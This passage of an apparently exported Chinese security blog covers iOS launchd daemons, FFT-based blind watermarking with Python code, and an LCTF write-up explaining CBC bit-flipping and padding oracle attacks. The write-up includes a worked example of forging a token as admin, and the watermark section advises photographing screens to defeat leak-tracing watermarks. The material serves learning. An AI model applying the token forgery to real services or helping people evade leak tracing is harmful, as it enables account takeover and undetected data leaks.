<p>大部分的iOS开发者可能会秉持着一个观念，就是iOS中没有着真正的后台多任务，App在后台的作用会被大大的限制，事实上在iOS4之前就是这样的，你的应用程序在你按下Home键的那一刻就已经灰飞烟灭了，在之后的iOS5，6之后虽然有所改进，支持了部分的后台运行，但是功能也很有限，在App上架的时候也会检查有没有越权操作。但自从iOS7之后，就涌现出了类似推送唤醒这样的功能，真正的后台多任务其实是存在的。关于iOS 的多任务可以参考<a href="http://andrew-anlu.github.io/blog/2016/04/19/ioszhong-de-duo-ren-wu/" target="_blank" rel="external">安陆的技术博客</a></p>
<p>后台多任务的问题说完之后我们就回到正题，所有的类Unix系统一样都有daemon(守护进程，windows中称service)。越狱之后daemin也将展现在我们的面前。</p>
<p>Daemon位后台运行而生，如imagent保障了iMessage的正确收发，syslogd则用于记录所有的系统日志等。在iOS中，Daemon主要是由一个可执行文件和一个plist组成。iOS的根进程是launchd，它会在开机时检查/System/Library/launchDaemons和/Library/LaunchDaemons下所有格式符合规定的plist文件，然后去启动对应的daemon，在这里的plist作用就和我们App中的info.plist文件作用类似，即记录守护进程的基本信息，例如；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">peterpan in ~ λ  plutil -p /System/Library/LaunchDaemons/finger.plist</div><div class="line">&#123;</div><div class="line">  &quot;InitGroups&quot; =&gt; 1</div><div class="line">  &quot;Disabled&quot; =&gt; 1</div><div class="line">  &quot;inetdCompatibility&quot; =&gt; &#123;</div><div class="line">    &quot;Wait&quot; =&gt; 0</div><div class="line">  &#125;</div><div class="line">  &quot;Sockets&quot; =&gt; &#123;</div><div class="line">    &quot;Listeners&quot; =&gt; &#123;</div><div class="line">      &quot;SockServiceName&quot; =&gt; &quot;finger&quot;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  &quot;ProgramArguments&quot; =&gt; [</div><div class="line">    0 =&gt; &quot;/usr/libexec/fingerd&quot;</div><div class="line">    1 =&gt; &quot;-s&quot;</div><div class="line">  ]</div><div class="line">  &quot;UserName&quot; =&gt; &quot;nobody&quot;</div><div class="line">  &quot;Label&quot; =&gt; &quot;com.apple.fingerd&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>相对于App，守护进程提供的功能要底层的多，逆向的难度也要大很多，随意改动也许就会出现类似于白苹果的惨案，所以暂时还是不要把这个当作联系的目标，虽然是测试机，但是还是值点钱的。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先我们已经了解到了什么是iOS逆向工程，以及逆向工程的步骤，还有iOS中的文件目录结构，在下一节的学习当中应该就会以实战的例子演示什么才是逆向工程了。但是其实这一节提到的所有知识深究下去都是可以研究很久的，在这里只会简单的提一下，下面丢几个链接，感兴趣的可以去了解：</p>
<ul>
<li><a href="http://andrew-anlu.github.io/blog/2016/04/19/ioszhong-de-duo-ren-wu/" target="_blank" rel="external">iOS的后台多任务</a></li>
<li><a href="http://blog.csdn.net/ssirreplaceable/article/details/52190215" target="_blank" rel="external">iOS中常见文件以及程序启动原理</a></li>
<li><a href="https://blog.duicode.com/410.html" target="_blank" rel="external">苹果系统目录结构</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 越狱平台介绍 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[盲水印技术]]></title>
      <url>/2017/11/24/%E7%9B%B2%E6%B0%B4%E5%8D%B0%E6%8A%80%E6%9C%AF/</url>
      <content type="html"><![CDATA[<p>我们都知道在网上寻找图片的时候，有时候会有可见的该死水印影响了我们的图片完整性，但是还有有一种我们看不见却真实存在的水印，你知道是什么吗？</p>
<a id="more"></a>
<h2 id="0X00引言"><a href="#0X00引言" class="headerlink" title="0X00引言"></a>0X00引言</h2><p>在这里先举一个例子来介绍一下吧，之前有个阿里的员工外泄信息被捕获的的报道。这个事情大概也就是在内部使用办公软件截图，使用PS工具修掉截图上可见的水印，然后传播出去，但是阿里通过了图片携带的不可见水印，解读了截图员工的员工编码，于是顺利的找到了这名员工。</p>
<p>一时间图片的盲水印技术也到了广泛的关注。为了了解这个技术我建议大家首先去看一下关于各种域之间的转换和诸如傅立叶变换之类的数学基础–<a href="http://www.elecfans.com/engineer/blog/20140527344277.html" target="_blank" rel="external">传送门</a>。关于傅立叶变换有一点需要记住的就是任何的周期函数，都可以看作是不同振幅，不同相位的正弦波的叠加。这是一个贯穿了时域和频域的方法，就像某首诗所作：</p>
<blockquote>
<p>你眼中看似落叶缤纷变换无常的世界，其实只是躺在上帝怀中早已铺好的乐章</p>
</blockquote>
<h2 id="0X01概述"><a href="#0X01概述" class="headerlink" title="0X01概述"></a>0X01概述</h2><p>数字水印技术也就是将一些标识信息，就好比宣示主权一样，直接嵌入数字载体，如图片，音频等。但显然不会影响这个载体的使用，从视觉或者听觉上都处于人可以识别的范畴以外，只有通过特殊的检测器或者阅读器才能读取到，除了我们常见的隐写术之外，这是一种新的信息隐藏技术。</p>
<p>所以这个时候我们就要提高警惕了，不光是我们看得到的水印，看不到的盲水印才是最致命的威胁，虽然不会让我们觉得难看，但是却关乎到知识产权的问题，虽然这个在天朝看的不太重就是emmm。</p>
<h2 id="0X02水印技术评判"><a href="#0X02水印技术评判" class="headerlink" title="0X02水印技术评判"></a>0X02水印技术评判</h2><p>既然有这个技术在这里，肯定会有一个好坏、高下之分，那么如何去衡量一个水印的好坏呢？我们可以从两个方面去看一下（隐蔽性和鲁棒性）：</p>
<ul>
<li>隐蔽性</li>
</ul>
<p>在我们的数字载体中嵌入了水印之后，不会引起明显的降质，并且不会被察觉。</p>
<ul>
<li>鲁棒性</li>
</ul>
<p>鲁棒性是指在经历多种有意或者无意的信号处理之后，数字水印仍能保持完整性或仍能被准确鉴别。可以利用信号处理过程包括信道噪、滤波、数字信号和模拟信号之间的转换、重采样，剪切、位移、尺度变化及有损压缩编码等。所以我们有时候可以根据这些点对图像进行攻击，导致图像的辨识度大幅度下降</p>
<h2 id="0X03水印分类"><a href="#0X03水印分类" class="headerlink" title="0X03水印分类"></a>0X03水印分类</h2><ul>
<li>按水印的特性来分<ul>
<li>鲁棒性数字水印：要求嵌入的水印能够经受各种常用的编辑处理</li>
<li>脆弱数字水印：需要对信号的改动足够敏感，人们可以根据脆弱水印判断数据是否被篡改</li>
</ul>
</li>
<li>按水印的检测过程<ul>
<li>明文水印：检测过程中，需要原始数据</li>
<li>盲水印：只需要密钥，不需要原始数据</li>
</ul>
</li>
<li>按水印的内容<ul>
<li>有意义水印：水印是商标等</li>
<li>无意义水印：序列号，仅作为普通标识</li>
</ul>
</li>
<li>按水印的隐藏位置<ul>
<li>空域</li>
<li>频域</li>
<li>时域</li>
</ul>
</li>
</ul>
<h2 id="0X04盲水印的实现"><a href="#0X04盲水印的实现" class="headerlink" title="0X04盲水印的实现"></a>0X04盲水印的实现</h2><p>在这里可以先丢出一个<a href="https://github.com/chishaxie/BlindWaterMark/blob/master/bwm.py" target="_blank" rel="external">传送门</a>，这是在github上的一个盲水印实现，在这里po出一个encode的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> cmd == <span class="string">'encode'</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'image&lt;%s&gt; + watermark&lt;%s&gt; -&gt; image(encoded)&lt;%s&gt;'</span> % (fn1, fn2, fn3)</div><div class="line">    img = cv2.imread(fn1)</div><div class="line">    wm = cv2.imread(fn2)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">'image'</span>)</div><div class="line">        plt.xticks([]), plt.yticks([])</div><div class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">'watermark'</span>)</div><div class="line">        plt.xticks([]), plt.yticks([])</div><div class="line"></div><div class="line">    <span class="comment"># print img.shape # 高, 宽, 通道</span></div><div class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</div><div class="line">    hwm = np.zeros((int(h * <span class="number">0.5</span>), w, img.shape[<span class="number">2</span>]))</div><div class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">0</span>] &gt; wm.shape[<span class="number">0</span>]</div><div class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">1</span>] &gt; wm.shape[<span class="number">1</span>]</div><div class="line">    hwm2 = np.copy(hwm)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(wm.shape[<span class="number">0</span>]):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(wm.shape[<span class="number">1</span>]):</div><div class="line">            hwm2[i][j] = wm[i][j]</div><div class="line"></div><div class="line">    random.seed(seed)</div><div class="line">    m, n = range(hwm.shape[<span class="number">0</span>]), range(hwm.shape[<span class="number">1</span>])</div><div class="line">    random.shuffle(m)</div><div class="line">    random.shuffle(n)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(hwm.shape[<span class="number">0</span>]):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(hwm.shape[<span class="number">1</span>]):</div><div class="line">            hwm[i][j] = hwm2[m[i]][n[j]]</div><div class="line"></div><div class="line">    rwm = np.zeros(img.shape)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(hwm.shape[<span class="number">0</span>]):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(hwm.shape[<span class="number">1</span>]):</div><div class="line">            rwm[i][j] = hwm[i][j]</div><div class="line">            rwm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = hwm[i][j]</div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(rwm)), \</div><div class="line">            plt.title(<span class="string">'encrypted(watermark)'</span>)</div><div class="line">        plt.xticks([]), plt.yticks([])</div><div class="line"></div><div class="line">    f1 = np.fft.fft2(img)</div><div class="line">    f2 = f1 + alpha * rwm</div><div class="line">    _img = np.fft.ifft2(f2)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</div><div class="line">            plt.title(<span class="string">'fft(image)'</span>)</div><div class="line">        plt.xticks([]), plt.yticks([])</div><div class="line"></div><div class="line">    img_wm = np.real(_img)</div><div class="line"></div><div class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, img_wm, [int(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</div><div class="line"></div><div class="line">    <span class="comment"># 这里计算下保存前后的(溢出)误差</span></div><div class="line">    img_wm2 = cv2.imread(fn3)</div><div class="line">    sum = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(img_wm.shape[<span class="number">0</span>]):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(img_wm.shape[<span class="number">1</span>]):</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> xrange(img_wm.shape[<span class="number">2</span>]):</div><div class="line">                sum += np.power(img_wm[i][j][k] - img_wm2[i][j][k], <span class="number">2</span>)</div><div class="line">    miss = np.sqrt(sum) / (img_wm.shape[<span class="number">0</span>] * img_wm.shape[<span class="number">1</span>] * img_wm.shape[<span class="number">2</span>]) * <span class="number">100</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Miss %s%% in save'</span> % miss</div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \</div><div class="line">            plt.title(<span class="string">'image(encoded)'</span>)</div><div class="line">        plt.xticks([]), plt.yticks([])</div><div class="line"></div><div class="line">    f2 = np.fft.fft2(img_wm)</div><div class="line">    rwm = (f2 - f1) / alpha</div><div class="line">    rwm = np.real(rwm)</div><div class="line"></div><div class="line">    wm = np.zeros(rwm.shape)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(int(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(rwm.shape[<span class="number">1</span>]):</div><div class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(int(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(rwm.shape[<span class="number">1</span>]):</div><div class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        <span class="keyword">assert</span> cv2.imwrite(<span class="string">'_bwm.debug.wm.jpg'</span>, wm)</div><div class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u'watermark'</span>)</div><div class="line">        plt.xticks([]), plt.yticks([])</div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        plt.show()</div></pre></td></tr></table></figure>
<p>中了一记源码大招之后是不是已经感觉奄奄一息了hhh，接下来还是从宏观上来讨论一下，赶快收起你们的西瓜刀。</p>
<p>添加盲水印的方法简单可以分为频域方法和空域方法，这两种方法添加了冗余信息，但在编码和压缩情况不变的情况下，不会使原始图像大小产生变化（原来是10MB添加盲水印之后还是10MB）</p>
<p>空域是指空间域，我们日常所见的图像就是空域。空域添加数字水印的方法是在空间域直接对图像操作（之所以说的这么绕，是因为不仅仅原图是空域，原图的差分等等也是空域），比如将水印直接叠加在图像上。</p>
<p>我们常说一个音有多高，这个音高是指频率；同样，<strong>图像灰度变化强烈的情况，</strong>也可以视为<strong>图像的频率</strong>。频域添加数字水印的方法，是指通过<strong>某种变换手段</strong>（傅里叶变换，离散余弦变换，小波变换等）将图像变换到<strong>频域（小波域）</strong>，在频域对图像添加水印，再通过<strong>逆变换</strong>，将图像转换为空间域。相对于空域手段，<strong>频域手段隐匿性更强，抗攻击性更高</strong>。</p>
<p>所谓对水印的攻击，是指破坏水印，包括<strong>涂抹，剪切，放缩，旋转，压缩，加噪，滤波等。</strong>数字盲水印不仅仅要敏捷性高（不被人抓到），也要防御性强（抗打）。就像Dota的敏捷英雄往往是脆皮，<strong>数字盲水印的隐匿性和鲁棒性</strong>是互斥的。（鲁棒性是抗攻击性的学术名字）</p>
<h2 id="0X05频域制作盲水印的方法"><a href="#0X05频域制作盲水印的方法" class="headerlink" title="0X05频域制作盲水印的方法"></a>0X05频域制作盲水印的方法</h2><p>由于信号是有频率的，一个信号可以看作是无数个不同阶的正弦信号的叠加。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-27%20%E4%B8%8B%E5%8D%8810.11.22.png" alt="屏幕快照 2017-11-27 下午10.11.22.png" title="" class="">
                <p>屏幕快照 2017-11-27 下午10.11.22.png</p>
            </figure>
<p>上式为傅里叶变换公式，<figure class="image-box">
                <img src="https://www.zhihu.com/equation?tex=f%28t%29" alt="f(t)" title="" class="">
                <p>f(t)</p>
            </figure>是指时域信号（对于信号我们说时域，因为是与时间有关的，而图像我们往往说空域，与空间有关），ω是指频率。想要对傅里叶变换有深入了解的同学，建议看一下《信号与系统》或者《数字信号处理》的教材，里面系统介绍了傅里叶变换、快速傅里叶变换、拉普拉斯变换、z变换等。</p>
<p>简而言之，我们有方法将时域信号转换成为频域，同样，<strong>我们也能将二维信号（图像）转换为频域。</strong>在上文中提到，<strong>图像的频率是指图像灰度变换的强烈情况</strong>。关于此方面更系统的知识，参见冈萨雷斯的《图像处理》。</p>
<p>下面以傅里叶变换为例，介绍通过频域给图像添加数字盲水印的方法。<strong>注意，</strong>因为图像是<strong>离散信号</strong>，我们实际用的是<strong>离散傅里叶变换</strong>，在本文采用的都是<a href="https://www.zhihu.com/question/22611929" target="_blank" rel="external"><strong>二维快速傅里叶变换</strong></a>，快速傅里叶变换与离散时间傅里叶变换等价，通过蝶型归并的手段，速度更快。下文中傅里叶变换均为二维快速傅里叶变换。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-28%20%E4%B8%8A%E5%8D%881.02.18.png" alt="屏幕快照 2017-11-28 上午1.02.18.png" title="" class="">
                <p>屏幕快照 2017-11-28 上午1.02.18.png</p>
            </figure>
<p>接下来我们就算对图像做一系列的处理之后我们仍然可以分离出水印图像，但是分离之后的水印图像是对称的，那么这是为什么呢？那么这就是属于数学部分的知识了。</p>
<p>在这里要借用一个知乎大神对于盲水印的鲁棒性实验，接下来会对加了水印的图片进行各种攻击，看看复原之后的水印效果如何：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-30%20%E4%B8%8B%E5%8D%885.13.40.png" alt="屏幕快照 2017-11-30 下午5.13.40.png" title="" class="">
                <p>屏幕快照 2017-11-30 下午5.13.40.png</p>
            </figure>
<p>接下来还进行了剪切攻击、饱和度攻击等十几种手段，但对于提取之后的盲水印的影响其实并不大，最后才发现屏摄会导致盲水印的失效：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-30%20%E4%B8%8B%E5%8D%885.15.40.png" alt="屏幕快照 2017-11-30 下午5.15.40.png" title="" class="">
                <p>屏幕快照 2017-11-30 下午5.15.40.png</p>
            </figure>
<p>经过屏摄之后的图片调整水印系数基本是无效的，因为在屏摄中不仅加入了椒盐噪声、乘性噪声、还有有规律的雪花纹理（摩尔纹），就算使用了多抽样滤波的方式也滤不掉屏摄引入的噪声。</p>
<h2 id="0X06总结"><a href="#0X06总结" class="headerlink" title="0X06总结"></a>0X06总结</h2><ol>
<li>我们从上面的例子中可以看出来盲水印的技术的鲁棒性还是很强的，但是鲁棒性越强，即证明利用了人眼的冗余信息越多，如果破坏了信息冗余部分也就破坏了水印，但是如果只是做信息传递，信息冗余定义的就要宽泛很多。不过也可以通过图像的位深度转换和加干扰来达到目的。</li>
<li>最后显然更关心的是如何去防护这种盲水印，其实一般来说都不会涉及到什么版权问题，截图肯定是不安全的，用手机拍或者用屏摄都是不错的选择。或者只截图其中一小部分，那么频域算法也是会失效的。</li>
<li>学习了盲水印之后才感觉在隐写术这一方面初窥门径，之前的那些隐写的方法其实没有什么新奇之处，稍微上了一点档次的也就是隐藏了一个png的IDAT数据块，直到和滤波、数学部分结合在一起的时候，才是隐写术真正的魅力所在。</li>
</ol>
<h2 id="0X07参考博客"><a href="#0X07参考博客" class="headerlink" title="0X07参考博客"></a>0X07参考博客</h2><ul>
<li><a href="https://www.zhihu.com/question/50735753" target="_blank" rel="external">阿里巴巴员工泄漏信息追查技术–知乎</a></li>
<li><a href="http://blog.jobbole.com/70549/" target="_blank" rel="external">傅立叶变换通俗易懂讲解</a></li>
<li>github盲水印工具</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 数字水印技术 傅立叶变换 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Lctf-sumup]]></title>
      <url>/2017/11/21/Lctf-sumup/</url>
      <content type="html"><![CDATA[<p>经历了lctf之后才了解到自己的密码学是多么的浅薄….还有就是这个攻击技术太NM恶心了，花了一整天学习这个漏洞利用</p>
<a id="more"></a>
<h1 id="0X00-CBC翻转技术"><a href="#0X00-CBC翻转技术" class="headerlink" title="0X00-CBC翻转技术"></a>0X00-CBC翻转技术</h1><p>CBC的全称是密文分组链接模式(Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。这个技术经常被使用于CBC反转攻击当中，我们可以通过CBC比特反转攻击绕过加密的会话令牌。根据道哥的说法，根据这个的Padding Oracle Attack方式在11年被评为了最具价值的服务器漏洞，下面就先介绍一下前提知识</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-22%20%E4%B8%8A%E5%8D%8811.35.15.png" alt="屏幕快照 2017-11-22 上午11.35.15.png" title="" class="">
                <p>屏幕快照 2017-11-22 上午11.35.15.png</p>
            </figure>
<p>在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密，当加密第一个明文分组时，由于不存在“前一个密文分组”，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组”，这个比特序列称为初始化向量（Initialization vector),通常缩写为IV,如果每次都使用相同的初始化向量（IV），当用同一密钥对同一明文进行加密时，所得到的密码一定是相同的，所以每次加密时都会随机产生一个不同的比特序列来作为初始化向量，避免这种情况产生。即：</p>
<ol>
<li>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</li>
<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
<li>将IV和第一组明文异或。</li>
<li>用密钥对3中xor后产生的密文加密。</li>
<li>用4中产生的密文对第二组明文进行xor操作。</li>
<li>用密钥对5中产生的密文加密。</li>
<li>重复4-7，到最后一组明文。</li>
<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
</ol>
<p>然后在解密的时候即为：</p>
<ol>
<li>从密文中提取出IV，然后将密文分组。</li>
<li>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</li>
<li>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</li>
<li>重复2-3，直到最后一组密文。</li>
</ol>
<p>加密：</p>
<ul>
<li>Ciphertext-0 = Encrypt(Plaintext XOR IV) —只用于第一个组块</li>
<li>Ciphertext-N = Encrypt(Plaintext XOR Ciphertext-N-1) —用于第二及剩下的组块</li>
</ul>
<p>在加密的过程中，如果最后一个分组的消息的长度没有达到一个组块的大小，则需要填充一些字节，被称为padding。以16个字节一个block为例，如果明文是<strong>I_am_Bob</strong>，长度为八个字节，则剩下的八个字节被填充了<strong>0x08，0x08，0x08，0x08，0x08，0x08，0x08，0x08</strong>这八个相同的字节，每个字节的值等于需要填充的字节长度。</p>
<p>解密：</p>
<ul>
<li>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</li>
<li>laintext-N = Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</li>
</ul>
<h1 id="0X01-Padding-Oracle-Atack"><a href="#0X01-Padding-Oracle-Atack" class="headerlink" title="0X01-Padding Oracle Atack"></a>0X01-Padding Oracle Atack</h1><p>我们可以注意到Ciphertext-N-1用来产生下一块明文，这就是字节翻转攻击发挥作用的地方，如果我们改变Ciphertext-N-1中的一个字节 ，然后和下一个解密后的密文进行一次xor，就可以得到不同的明文，而这个明文是我们可以控制的。利用这点进行伪造令牌环，达到绕过服务端验证的效果。</p>
<p>CBC比特反转攻击的目的是攻击者通过修改密文来操纵解密后的明文，攻击者会对初始化向量（IV）中的任意比特位进行反转（1变0，0变1），则明文分组（解密后得到的明文分组）中相应的比特也会被反转。比如一个叫admin的用户，登录，经过CBC模式加密后，token为”aaabbbccc999”,现在有一个攻击者，叫john，登录，经过CBC模式加密后，token为cccbbbccc1111,现在john将token改为”ffcbbbccc1111”，发现登录名变成了ohn，所以他知道token第一个位的ff转换成了，经过几轮测试，他发现如果将token改为“7bcbbbccc1111”，则登录名变成了’aohn’，最后他通过发送token为7bdc995465到服务器，发现自己已经变成了admin。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-23%20%E4%B8%8A%E5%8D%8810.28.02.png" alt="屏幕快照 2017-11-23 上午10.28.02.png" title="" class="">
                <p>屏幕快照 2017-11-23 上午10.28.02.png</p>
            </figure>
<p>所以我们就可以通过改变传输的IV就可以控制密文的解密，通常来说账户名和密码比较短，控制了IV之后就可以控制xor出来的第一段明文了。这里还是以<code>I_am_Bob</code>和<code>aes-128-cbc</code>为例。如果攻击者构造IV为16个0字节，那么显然在解密时padding是不正确的，应用就会抛出一个错误回显：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-23%20%E4%B8%8B%E5%8D%8812.21.52.png" alt="屏幕快照 2017-11-23 下午12.21.52.png" title="" class="">
                <p>屏幕快照 2017-11-23 下午12.21.52.png</p>
            </figure>
<p>正确的padding值如下：</p>
<blockquote>
<p>1个字节的padding为<strong>0x01</strong></p>
<p>2个字节的padding为<strong>0x02,0x02</strong></p>
<p>3个字节的padding为<strong>0x03,0x03,0x03</strong></p>
<p>4个字节的padding为<strong>0x04,0x04,0x04,0x04</strong></p>
<p>……</p>
</blockquote>
<p>因为慢慢调整<strong>IV</strong>的值，以希望解密后，最后一个字节的值为正确的padding byte，比如一个0x01。</p>
<p><strong>因为middle是固定的（此时我们不知道middle的值），所以从0x00到0xFF之间，只可能有一个值与middle的最后一个字节异或后，结果是0x01。</strong>通过遍历这255个值，可以找出<strong>IV</strong>需要的最后一个字节，这里还利用了异或的一个性质就是任何数和0异或都是他本身。</p>
<figure class="image-box">
                <img src="http://upload-images.jianshu.io/upload_images/6295550-b1d939d975d3a657.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img" title="" class="">
                <p>img</p>
            </figure>
<p>此时根据异或的性质，使用<strong>0x5e</strong>和<strong>0x01</strong>进行<strong>xor</strong>就可以得到<strong>middle</strong>的最后一个值<strong>0x5f</strong>。</p>
<p>在正确匹配了<strong>padding“0x01”</strong>后，需要做的是继续推导出剩下的<strong>middle</strong>,根据padding的标准，当需要padding两个字节时，其值应该为<strong>0x02,0x02</strong>。而我们已经知道了<strong>middle</strong>的最后一个字节为<strong>0x5f</strong>，因此可以更新<strong>IV</strong>的最后一个字节为<strong>0x5f^0x02=0x5d</strong>，此时可以开始遍历<strong>IV</strong>的倒数第二个字节。</p>
<figure class="image-box">
                <img src="http://upload-images.jianshu.io/upload_images/6295550-3cae04871d34fdac.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img" title="" class="">
                <p>img</p>
            </figure>
<p>由此可得<strong>middle</strong>的倒数第二个字节为<strong>0x3c^0x02=0x3e</strong>。以此类推，可以推导出所有的<strong>middle</strong>。</p>
<p>获得<strong>middle</strong>后，与原来的<strong>IV</strong>（加密的IV）进行<strong>xor</strong>，便可得到明文。在这个过程中，仅仅用到了<strong>密文和IV</strong>，通过对<strong>padding</strong>的推导，即可还原出明文，而不需要知道密钥(key)是什么。而<strong>IV</strong>并不需要保密，它往往是以明文形式发送的。</p>
<p><strong>而获得middle后，还可以通过改变IV，使密文解密为任意明文。</strong>根据异或的性质，有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">原明文 ^ 原IV = middle</div><div class="line">新明文 ^ 新IV = middle</div><div class="line">原明文 ^ 原IV ^ 新明文 = 新IVq</div></pre></td></tr></table></figure>
<p>故只要把<strong>原IV</strong>改为计算得到的<strong>新IV</strong>，就可使密文解密为任意明文。</p>
<p>为了方便理解，下面丢出几个变量之间的层级关系图：</p>
<figure class="image-box">
